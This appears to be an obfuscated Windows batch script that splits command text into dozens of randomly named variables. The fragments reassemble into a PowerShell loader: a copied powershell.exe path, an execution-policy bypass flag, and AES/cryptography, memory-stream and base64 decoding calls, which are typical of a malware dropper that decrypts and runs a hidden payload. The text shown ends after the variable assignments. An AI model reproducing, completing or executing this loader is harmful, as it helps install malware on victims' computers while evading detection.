@echo off
set "NPWrvRqieS=in"
set "JMMboSrgZw=32"
set "gjdJdLNCwC=rS"
set "BjbgrPxkWP=we"
set "FbctUTjzCZ=ws"
set "ewuRKvTsGo=do"
set "EzNjNvaVbf=ll"
set "gnXdPJEWHL=1."
set "qnlNJkIVcs=ow"
set "bDTPUGSBmx=:\"
set "nFmRAjHbNE= C"
set "gLzSQHDliB=.e"
set "mRcHkaBKYI=\W"
set "QOFcWAzlhr=nd"
set "NCKXZzxSCP=py"
set "HIaIecbemj=y "
set "wYCMSkuTLC=\v"
set "OBWdRoMGXg=he"
set "sTqbBKeQiv=xe"
set "HVFfFURMzg=s\"
set "lbUZKrBKud=we"
set "gLcHAXpYrL=co"
set "HRFfzGUFCQ=he"
set "ksOArtgjgH=Wi"
set "hGtVgWhbQh=st"
set "KlhNaViAxb=em"
set "cxVfNnXRTu=Sy"
set "VRIgkHvTWH=0\"
set "RdoqjEqwBl=rs"
set "LRBrfJpSmp=po"
set "uLKrzUXIvT=ll"
set "tyCOoTQuFx=Po"
set "FUMoJftXQp= /"
set "zustBSmduS= %~dp0"
set "CApiOJKabC=cd"
set "TdUvpCRvsQ=ose("
set "jWVbrwnjOJ=b = "
set "tTqPQuiGYK=SjYd"
set "CFVvgeffPc=Mu);"
set "zjEPgZadCT=oL'["
set "iMjDukuXQH=-4] "
set "whNGlQpYDn=wTlt"
set "DOFkqBnVLN=$IKL"
set "LuDVMiVIrR=fore"
set "ytqqnEnePZ=th('"
set "LhntvtNQPV=ne);"
set "xlCKSPunhB=tem."
set "boemovUSeJ===')"
set "dQoAwoWQEh=tion"
set "MjEKYmEDXK=ss -"
set "ZfcEhgCzrd=hy.A"
set "TvQYMXVWcp=.Mem"
set "IVevwpZXXZ=CFxo"
set "vuwJvadwfj=n ''"
set "BSfPReHZcT=Syst"
set "JAuLdWsLRo=$sVj"
set "icwaseyJip=ypto"
set "BdXOZLocwo=[]] "
set "MnDATomRkE=p = "
set "GXRICDXJpe=($xo"
set "ciZWiDzWOY=$vHF"
set "mYjNQYohkO=onve"
set "ExOhmnxMez=-Obj"
set "aFgXmlNRPU=gsYZ"
set "AUqHxJDHpR=16] "
set "EdnUuhaBjp=HFWp"
set "LzwLkYWmAf=-ep "
set "ojzwZGjboE=TllA"
set "HCwEeEIVmC=; };"
set "LWtCNaeArg=zuZI"
set "iRBbBcSpEo=.Cry"
set "hQaUYKmDGT=Star"
set "nCGedgNCzv=y.Cr"
set "yvIWRjoCWZ=;$aN"
set "xEEKOsAdZF=ing("
set "EsGxzhmgde=em.C"
set "nkyqPeagiz=);$s"
set "rpaExlpBOS=VT.T"
set "MOFqTcMLgy=O.Me"
set "EnlpIEJUHd=orF'"
set "RebrGSxylr=Syst"
set "qBRRLJjuXN=hSk."
set "rReCtzmRLd=raph"
set "dNFyXGQCvQ=7;$E"
set "qmopuiFwjt=r.Su"
set "nzwwcyCStQ=Obje"
set "CfTaxpJoVu=F'[-"
